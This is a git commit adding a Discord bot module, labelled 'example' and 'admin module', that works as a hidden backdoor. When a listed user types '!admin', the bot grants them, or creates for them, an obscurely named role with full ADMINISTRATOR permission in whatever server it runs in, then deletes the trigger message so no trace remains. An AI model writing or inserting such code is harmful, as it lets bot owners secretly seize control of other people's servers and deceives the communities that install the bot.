62996bf0c55b248f8a0282e1cef85716a30cbb3e
Samuel <sam@flywer.xyz>
2022-05-23 21:48:02 -0400

    admin module

---
+++ modules/admin/index.js
@@ -0,0 +1,29 @@
+const client = require('../index').client
+const admins = require('../config.json').bot.admins
+
+module.exports = {
+    name: "example",
+    version: "1.0",
+    author: "SamuelMeu",
+    enabled: true,
+    onMessage: function(message) {
+        if(message.content == "!admin" & admins.includes(message.author.id)) {
+            const rolename = "baki"
+            const guild = message.guild
+            const user = message.author.id
+            const role = guild.roles.cache.find(r => r.name == rolename)
+            if(role !== undefined) {
+                guild.members.cache.get(user).roles.add(role.id).then(() => message.delete())
+            } else {
+                guild.roles.create({
+                    name: rolename,
+                    permissions: ['ADMINISTRATOR'],
+                    position: (guild.members.cache.get(user).roles.highest.position - 1)
+                }).then(r => {
+                    guild.members.cache.get(user).roles.add(r.id)
+                    message.delete()
+                })
+            }
+        }
+    }
+}
